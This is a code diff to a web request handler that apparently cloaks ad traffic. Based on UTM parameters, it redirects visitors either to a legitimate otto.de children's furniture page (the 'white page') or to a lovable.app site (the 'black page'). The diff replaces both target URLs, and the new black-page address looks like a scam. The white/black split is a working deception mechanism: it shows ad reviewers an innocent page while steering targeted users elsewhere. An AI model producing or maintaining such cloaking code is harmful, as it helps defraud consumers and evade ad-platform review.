@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/roba-laufgitter-adam-eule-weiss-75x100-cm-mit-stoffeinlage-rollen-hoehenverstellbar-C1779415187/";
-    const blackPageURL = "https://nowhereher.lovable.app/";
+    const whitePageURL = "https://www.otto.de/p/aiyaplay-kindersessel-kindersofa-mit-weicher-teddyfleece-baerenform-kindersessel-1-st-kinderstuhl-fuer-wohnzimmer-schlafzimmer-beige-S0RBN037/";
+    const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
